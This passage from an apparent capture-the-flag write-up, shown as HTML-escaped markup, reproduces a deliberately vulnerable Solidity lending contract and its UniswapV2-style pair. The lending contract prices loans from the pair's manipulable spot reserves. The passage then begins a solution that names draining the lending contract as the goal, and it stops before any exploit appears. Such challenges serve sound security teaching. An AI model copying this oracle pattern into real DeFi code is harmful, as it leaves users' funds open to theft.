&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Lending  {
&lt;&#x2F;span&gt;&lt;span&gt;    ERC20 public collateralToken;
&lt;&#x2F;span&gt;&lt;span&gt;    ERC20 public borrowToken;
&lt;&#x2F;span&gt;&lt;span&gt;    Pair public pair;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; uint256) public usersCollateral;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; uint256) public usersUsedCollateral;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; uint256) public usersBorrowed;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(Pair _pair, ERC20 _collateralToken, ERC20 _borrowToken) {
&lt;&#x2F;span&gt;&lt;span&gt;        collateralToken = _collateralToken;
&lt;&#x2F;span&gt;&lt;span&gt;        pair = _pair;
&lt;&#x2F;span&gt;&lt;span&gt;        borrowToken = _borrowToken;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function addCollateral(uint256 amount) external {
&lt;&#x2F;span&gt;&lt;span&gt;        collateralToken.transferFrom(msg.sender, address(this), amount);
&lt;&#x2F;span&gt;&lt;span&gt;        usersCollateral[msg.sender] += amount;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function removeCollateral(uint256 amount) external {
&lt;&#x2F;span&gt;&lt;span&gt;        require(usersBorrowed[msg.sender] == 0, &amp;quot;You have debt&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(usersCollateral[msg.sender] &amp;gt;= amount, &amp;quot;Not enough collateral&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        collateralToken.transfer(msg.sender, amount);
&lt;&#x2F;span&gt;&lt;span&gt;        usersCollateral[msg.sender] -= amount;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function borrow(uint256 _amount) external {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 needCollateral = _amount * getExchangeRate() &#x2F; 1e18;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(needCollateral &amp;lt;= usersCollateral[msg.sender], &amp;quot;You don&amp;#39;t have enough collateral&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        borrowToken.transfer(msg.sender, _amount);
&lt;&#x2F;span&gt;&lt;span&gt;        usersUsedCollateral[msg.sender] += needCollateral;
&lt;&#x2F;span&gt;&lt;span&gt;        usersCollateral[msg.sender] -= needCollateral;
&lt;&#x2F;span&gt;&lt;span&gt;        usersBorrowed[msg.sender] += _amount;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function repay(uint256 _amount) external {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 collateral = (usersUsedCollateral[msg.sender] * _amount) &#x2F; usersBorrowed[msg.sender];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        borrowToken.transferFrom(msg.sender, address(this), _amount);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        usersUsedCollateral[msg.sender] -= collateral;
&lt;&#x2F;span&gt;&lt;span&gt;        usersCollateral[msg.sender] += collateral;
&lt;&#x2F;span&gt;&lt;span&gt;        usersBorrowed[msg.sender] -= _amount;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getExchangeRate() public view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return pair.getSpotPrice();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function isSolved() external view returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        return borrowToken.balanceOf(address(this)) == 0;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;library SafeMath {
&lt;&#x2F;span&gt;&lt;span&gt;    function add(uint x, uint y) internal pure returns (uint z) {
&lt;&#x2F;span&gt;&lt;span&gt;        require((z = x + y) &amp;gt;= x, &amp;#39;ds-math-add-overflow&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function sub(uint x, uint y) internal pure returns (uint z) {
&lt;&#x2F;span&gt;&lt;span&gt;        require((z = x - y) &amp;lt;= x, &amp;#39;ds-math-sub-underflow&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function mul(uint x, uint y) internal pure returns (uint z) {
&lt;&#x2F;span&gt;&lt;span&gt;        require(y == 0 || (z = x * y) &#x2F; y == x, &amp;#39;ds-math-mul-overflow&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;library UQ112x112 {
&lt;&#x2F;span&gt;&lt;span&gt;    uint224 constant Q112 = 2**112;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; encode a uint112 as a UQ112x112
&lt;&#x2F;span&gt;&lt;span&gt;    function encode(uint112 y) internal pure returns (uint224 z) {
&lt;&#x2F;span&gt;&lt;span&gt;        z = uint224(y) * Q112; &#x2F;&#x2F; never overflows
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; divide a UQ112x112 by a uint112, returning a UQ112x112
&lt;&#x2F;span&gt;&lt;span&gt;    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {
&lt;&#x2F;span&gt;&lt;span&gt;        z = x &#x2F; uint224(y);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface IUniswapV2Callee {
&lt;&#x2F;span&gt;&lt;span&gt;    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Pair is ERC20 {
&lt;&#x2F;span&gt;&lt;span&gt;    using SafeMath  for uint;
&lt;&#x2F;span&gt;&lt;span&gt;    using UQ112x112 for uint224;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint public constant MINIMUM_LIQUIDITY = 10**3;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes4 private constant SELECTOR = bytes4(keccak256(bytes(&amp;#39;transfer(address,uint256)&amp;#39;)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    address public factory;
&lt;&#x2F;span&gt;&lt;span&gt;    address public token0;
&lt;&#x2F;span&gt;&lt;span&gt;    address public token1;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint112 private reserve0;           &#x2F;&#x2F; uses single storage slot, accessible via getReserves
&lt;&#x2F;span&gt;&lt;span&gt;    uint112 private reserve1;           &#x2F;&#x2F; uses single storage slot, accessible via getReserves
&lt;&#x2F;span&gt;&lt;span&gt;    uint32  private blockTimestampLast; &#x2F;&#x2F; uses single storage slot, accessible via getReserves
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint public price0CumulativeLast;
&lt;&#x2F;span&gt;&lt;span&gt;    uint public price1CumulativeLast;
&lt;&#x2F;span&gt;&lt;span&gt;    uint public kLast; &#x2F;&#x2F; reserve0 * reserve1, as of immediately after the most recent liquidity event
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint private unlocked = 1;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier lock() {
&lt;&#x2F;span&gt;&lt;span&gt;        require(unlocked == 1, &amp;#39;UniswapV2: LOCKED&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;        unlocked = 0;
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;        unlocked = 1;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {
&lt;&#x2F;span&gt;&lt;span&gt;        _reserve0 = reserve0;
&lt;&#x2F;span&gt;&lt;span&gt;        _reserve1 = reserve1;
&lt;&#x2F;span&gt;&lt;span&gt;        _blockTimestampLast = blockTimestampLast;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getSpotPrice() external view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return Math.mulDiv(reserve1, 1e18, reserve0);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _safeTransfer(address token, address to, uint value) private {
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));
&lt;&#x2F;span&gt;&lt;span&gt;        require(success &amp;amp;&amp;amp; (data.length == 0 || abi.decode(data, (bool))), &amp;#39;UniswapV2: TRANSFER_FAILED&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event Mint(address indexed sender, uint amount0, uint amount1);
&lt;&#x2F;span&gt;&lt;span&gt;    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
&lt;&#x2F;span&gt;&lt;span&gt;    event Swap(
&lt;&#x2F;span&gt;&lt;span&gt;        address indexed sender,
&lt;&#x2F;span&gt;&lt;span&gt;        uint amount0In,
&lt;&#x2F;span&gt;&lt;span&gt;        uint amount1In,
&lt;&#x2F;span&gt;&lt;span&gt;        uint amount0Out,
&lt;&#x2F;span&gt;&lt;span&gt;        uint amount1Out,
&lt;&#x2F;span&gt;&lt;span&gt;        address indexed to
&lt;&#x2F;span&gt;&lt;span&gt;    );
&lt;&#x2F;span&gt;&lt;span&gt;    event Sync(uint112 reserve0, uint112 reserve1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor() ERC20(&amp;quot;ST&amp;quot;, &amp;quot;ST&amp;quot;) {
&lt;&#x2F;span&gt;&lt;span&gt;        factory = msg.sender;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; called once by the factory at time of deployment
&lt;&#x2F;span&gt;&lt;span&gt;    function initialize(address _token0, address _token1) external {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.sender == factory, &amp;#39;UniswapV2: FORBIDDEN&amp;#39;); &#x2F;&#x2F; sufficient check
&lt;&#x2F;span&gt;&lt;span&gt;        token0 = _token0;
&lt;&#x2F;span&gt;&lt;span&gt;        token1 = _token1;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; update reserves and, on the first call per block, price accumulators
&lt;&#x2F;span&gt;&lt;span&gt;    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {
&lt;&#x2F;span&gt;&lt;span&gt;        require(balance0 &amp;lt;= type(uint112).max &amp;amp;&amp;amp; balance1 &amp;lt;= type(uint112).max, &amp;#39;UniswapV2: OVERFLOW&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;        uint32 blockTimestamp = uint32(block.timestamp % 2**32);
&lt;&#x2F;span&gt;&lt;span&gt;        uint32 timeElapsed = blockTimestamp - blockTimestampLast; &#x2F;&#x2F; overflow is desired
&lt;&#x2F;span&gt;&lt;span&gt;        if (timeElapsed &amp;gt; 0 &amp;amp;&amp;amp; _reserve0 != 0 &amp;amp;&amp;amp; _reserve1 != 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            &#x2F;&#x2F; * never overflows, and + overflow is desired
&lt;&#x2F;span&gt;&lt;span&gt;            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;
&lt;&#x2F;span&gt;&lt;span&gt;            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        reserve0 = uint112(balance0);
&lt;&#x2F;span&gt;&lt;span&gt;        reserve1 = uint112(balance1);
&lt;&#x2F;span&gt;&lt;span&gt;        blockTimestampLast = blockTimestamp;
&lt;&#x2F;span&gt;&lt;span&gt;        emit Sync(reserve0, reserve1);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; if fee is on, mint liquidity equivalent to 1&#x2F;6th of the growth in sqrt(k)
&lt;&#x2F;span&gt;&lt;span&gt;    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) {
&lt;&#x2F;span&gt;&lt;span&gt;        address feeTo = address(0);
&lt;&#x2F;span&gt;&lt;span&gt;        feeOn = feeTo != address(0);
&lt;&#x2F;span&gt;&lt;span&gt;        uint _kLast = kLast; &#x2F;&#x2F; gas savings
&lt;&#x2F;span&gt;&lt;span&gt;        if (feeOn) {
&lt;&#x2F;span&gt;&lt;span&gt;            if (_kLast != 0) {
&lt;&#x2F;span&gt;&lt;span&gt;                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));
&lt;&#x2F;span&gt;&lt;span&gt;                uint rootKLast = Math.sqrt(_kLast);
&lt;&#x2F;span&gt;&lt;span&gt;                if (rootK &amp;gt; rootKLast) {
&lt;&#x2F;span&gt;&lt;span&gt;                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));
&lt;&#x2F;span&gt;&lt;span&gt;                    uint denominator = rootK.mul(5).add(rootKLast);
&lt;&#x2F;span&gt;&lt;span&gt;                    uint liquidity = numerator &#x2F; denominator;
&lt;&#x2F;span&gt;&lt;span&gt;                    if (liquidity &amp;gt; 0) _mint(feeTo, liquidity);
&lt;&#x2F;span&gt;&lt;span&gt;                }
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        } else if (_kLast != 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            kLast = 0;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; this low-level function should be called from a contract which performs important safety checks
&lt;&#x2F;span&gt;&lt;span&gt;    function mint(address to) external lock returns (uint liquidity) {
&lt;&#x2F;span&gt;&lt;span&gt;        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); &#x2F;&#x2F; gas savings
&lt;&#x2F;span&gt;&lt;span&gt;        uint balance0 = IERC20(token0).balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;        uint balance1 = IERC20(token1).balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;        uint amount0 = balance0.sub(_reserve0);
&lt;&#x2F;span&gt;&lt;span&gt;        uint amount1 = balance1.sub(_reserve1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        bool feeOn = _mintFee(_reserve0, _reserve1);
&lt;&#x2F;span&gt;&lt;span&gt;        uint _totalSupply = totalSupply; &#x2F;&#x2F; gas savings, must be defined here since totalSupply can update in _mintFee
&lt;&#x2F;span&gt;&lt;span&gt;        if (_totalSupply == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);
&lt;&#x2F;span&gt;&lt;span&gt;           _mint(address(0), MINIMUM_LIQUIDITY); &#x2F;&#x2F; permanently lock the first MINIMUM_LIQUIDITY tokens
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            liquidity = Math.min(amount0.mul(_totalSupply) &#x2F; _reserve0, amount1.mul(_totalSupply) &#x2F; _reserve1);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        require(liquidity &amp;gt; 0, &amp;#39;UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;        _mint(to, liquidity);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _update(balance0, balance1, _reserve0, _reserve1);
&lt;&#x2F;span&gt;&lt;span&gt;        if (feeOn) kLast = uint(reserve0).mul(reserve1); &#x2F;&#x2F; reserve0 and reserve1 are up-to-date
&lt;&#x2F;span&gt;&lt;span&gt;        emit Mint(msg.sender, amount0, amount1);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; this low-level function should be called from a contract which performs important safety checks
&lt;&#x2F;span&gt;&lt;span&gt;    function burn(address to) external lock returns (uint amount0, uint amount1) {
&lt;&#x2F;span&gt;&lt;span&gt;        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); &#x2F;&#x2F; gas savings
&lt;&#x2F;span&gt;&lt;span&gt;        address _token0 = token0;                                &#x2F;&#x2F; gas savings
&lt;&#x2F;span&gt;&lt;span&gt;        address _token1 = token1;                                &#x2F;&#x2F; gas savings
&lt;&#x2F;span&gt;&lt;span&gt;        uint balance0 = IERC20(_token0).balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;        uint balance1 = IERC20(_token1).balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;        uint liquidity = balanceOf[address(this)];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        bool feeOn = _mintFee(_reserve0, _reserve1);
&lt;&#x2F;span&gt;&lt;span&gt;        uint _totalSupply = totalSupply; &#x2F;&#x2F; gas savings, must be defined here since totalSupply can update in _mintFee
&lt;&#x2F;span&gt;&lt;span&gt;        amount0 = liquidity.mul(balance0) &#x2F; _totalSupply; &#x2F;&#x2F; using balances ensures pro-rata distribution
&lt;&#x2F;span&gt;&lt;span&gt;        amount1 = liquidity.mul(balance1) &#x2F; _totalSupply; &#x2F;&#x2F; using balances ensures pro-rata distribution
&lt;&#x2F;span&gt;&lt;span&gt;        require(amount0 &amp;gt; 0 &amp;amp;&amp;amp; amount1 &amp;gt; 0, &amp;#39;UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;        _burn(address(this), liquidity);
&lt;&#x2F;span&gt;&lt;span&gt;        _safeTransfer(_token0, to, amount0);
&lt;&#x2F;span&gt;&lt;span&gt;        _safeTransfer(_token1, to, amount1);
&lt;&#x2F;span&gt;&lt;span&gt;        balance0 = IERC20(_token0).balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;        balance1 = IERC20(_token1).balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _update(balance0, balance1, _reserve0, _reserve1);
&lt;&#x2F;span&gt;&lt;span&gt;        if (feeOn) kLast = uint(reserve0).mul(reserve1); &#x2F;&#x2F; reserve0 and reserve1 are up-to-date
&lt;&#x2F;span&gt;&lt;span&gt;        emit Burn(msg.sender, amount0, amount1, to);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; this low-level function should be called from a contract which performs important safety checks
&lt;&#x2F;span&gt;&lt;span&gt;    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {
&lt;&#x2F;span&gt;&lt;span&gt;        require(amount0Out &amp;gt; 0 || amount1Out &amp;gt; 0, &amp;#39;UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); &#x2F;&#x2F; gas savings
&lt;&#x2F;span&gt;&lt;span&gt;        require(amount0Out &amp;lt; _reserve0 &amp;amp;&amp;amp; amount1Out &amp;lt; _reserve1, &amp;#39;UniswapV2: INSUFFICIENT_LIQUIDITY&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint balance0;
&lt;&#x2F;span&gt;&lt;span&gt;        uint balance1;
&lt;&#x2F;span&gt;&lt;span&gt;        { &#x2F;&#x2F; scope for _token{0,1}, avoids stack too deep errors
&lt;&#x2F;span&gt;&lt;span&gt;        address _token0 = token0;
&lt;&#x2F;span&gt;&lt;span&gt;        address _token1 = token1;
&lt;&#x2F;span&gt;&lt;span&gt;        require(to != _token0 &amp;amp;&amp;amp; to != _token1, &amp;#39;UniswapV2: INVALID_TO&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount0Out &amp;gt; 0) _safeTransfer(_token0, to, amount0Out); &#x2F;&#x2F; optimistically transfer tokens
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount1Out &amp;gt; 0) _safeTransfer(_token1, to, amount1Out); &#x2F;&#x2F; optimistically transfer tokens
&lt;&#x2F;span&gt;&lt;span&gt;        if (data.length &amp;gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);
&lt;&#x2F;span&gt;&lt;span&gt;        balance0 = IERC20(_token0).balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;        balance1 = IERC20(_token1).balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        uint amount0In = balance0 &amp;gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
&lt;&#x2F;span&gt;&lt;span&gt;        uint amount1In = balance1 &amp;gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
&lt;&#x2F;span&gt;&lt;span&gt;        require(amount0In &amp;gt; 0 || amount1In &amp;gt; 0, &amp;#39;UniswapV2: INSUFFICIENT_INPUT_AMOUNT&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;        { &#x2F;&#x2F; scope for reserve{0,1}Adjusted, avoids stack too deep errors
&lt;&#x2F;span&gt;&lt;span&gt;        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
&lt;&#x2F;span&gt;&lt;span&gt;        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
&lt;&#x2F;span&gt;&lt;span&gt;        require(balance0Adjusted.mul(balance1Adjusted) &amp;gt;= uint(_reserve0).mul(_reserve1).mul(1000**2), &amp;#39;UniswapV2: K&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _update(balance0, balance1, _reserve0, _reserve1);
&lt;&#x2F;span&gt;&lt;span&gt;        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; force balances to match reserves
&lt;&#x2F;span&gt;&lt;span&gt;    function skim(address to) external {
&lt;&#x2F;span&gt;&lt;span&gt;        address _token0 = token0; &#x2F;&#x2F; gas savings
&lt;&#x2F;span&gt;&lt;span&gt;        address _token1 = token1; &#x2F;&#x2F; gas savings
&lt;&#x2F;span&gt;&lt;span&gt;        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
&lt;&#x2F;span&gt;&lt;span&gt;        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; force reserves to match balances
&lt;&#x2F;span&gt;&lt;span&gt;    function sync() external {
&lt;&#x2F;span&gt;&lt;span&gt;        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;solution-2&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution-2&quot; aria-label=&quot;Anchor link for: solution-2&quot;&gt;Solution&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;A Defi protocol requires nothing else than except complete understanding about the protocol control flow. Lets observe what each contract in this protocol is doing.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Lending Contract&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Add collateral using &lt;code&gt;collateralToken&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Borrow &lt;code&gt;borrowToken&lt;&#x2F;code&gt; against their collateral&lt;&#x2F;li&gt;
&lt;li&gt;Repay borrowed tokens&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Uses a Pair contract to determine exchange rates&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Pair Contract&lt;&#x2F;strong&gt; (UniswapV2-style):&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Implements an automated market maker (AMM)&lt;&#x2F;li&gt;
&lt;li&gt;Manages liquidity between two tokens (token0 and token1)&lt;&#x2F;li&gt;
&lt;li&gt;Handles token swaps and price calculations&lt;&#x2F;li&gt;
&lt;li&gt;Maintains reserves and updates prices&lt;&#x2F;li&gt;
&lt;li&gt;Provides functions for adding&#x2F;removing liquidity&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Used by the Lending contract to get exchange rates&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SafeMath Library&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Provides safe arithmetic operations&lt;&#x2F;li&gt;
&lt;li&gt;Prevents overflows&#x2F;underflows in mathematical calculations&lt;&#x2F;li&gt;
&lt;li&gt;Used by the Pair contract for calculations&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;UQ112x112 Library&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Handles fixed-point number calculations&lt;&#x2F;li&gt;
&lt;li&gt;Used for price calculations in the Pair contract&lt;&#x2F;li&gt;
&lt;li&gt;Helps maintain precision in price calculations&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;IUniswapV2Callee Interface&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Defines the callback interface for flash swaps&lt;&#x2F;li&gt;
&lt;li&gt;Used when executing flash swaps in the Pair contract&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;The goal is to drain all &lt;code&gt;borrowToken&lt;&#x2F;code&gt; from the Lending contract. I always prefer to know the initial state of the protocol by querying all the information from the contracts deployed. The following is the state of the protocol when we initially received the challenge instance.&lt;&#x2F;p&gt;
